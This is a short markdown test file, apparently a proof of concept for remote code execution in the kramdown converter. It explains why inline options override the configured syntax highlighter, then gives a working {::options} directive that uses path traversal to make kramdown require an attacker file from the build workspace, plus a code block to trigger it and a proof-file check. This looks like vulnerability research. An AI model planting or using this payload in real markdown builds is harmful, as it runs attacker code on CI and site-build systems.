---
---

# Test 22: syntax_highlighter RCE WITHOUT forbidden_inline_options override

This proves the vulnerability works even with default forbidden_inline_options: [:template]
because syntax_highlighter is NOT in the forbidden list.

The {::options} inline directive overrides the OVERRIDES-forced "rouge" value
because inline options merge LAST in kramdown's converter initialization:
  converter = new(tree, Options.merge(options.merge(tree.options[:options])))

{::options syntax_highlighter="../../../../../../../../../../../../../../../../../../github/workspace/evil" /}

```javascript
// This triggers the syntax highlighter require path traversal
// kramdown will try: require "kramdown/converter/syntax_highlighter/../../../../../../../../../../github/workspace/evil"
console.log("trigger");
```

After build, check for rce3-proof.txt in the output.
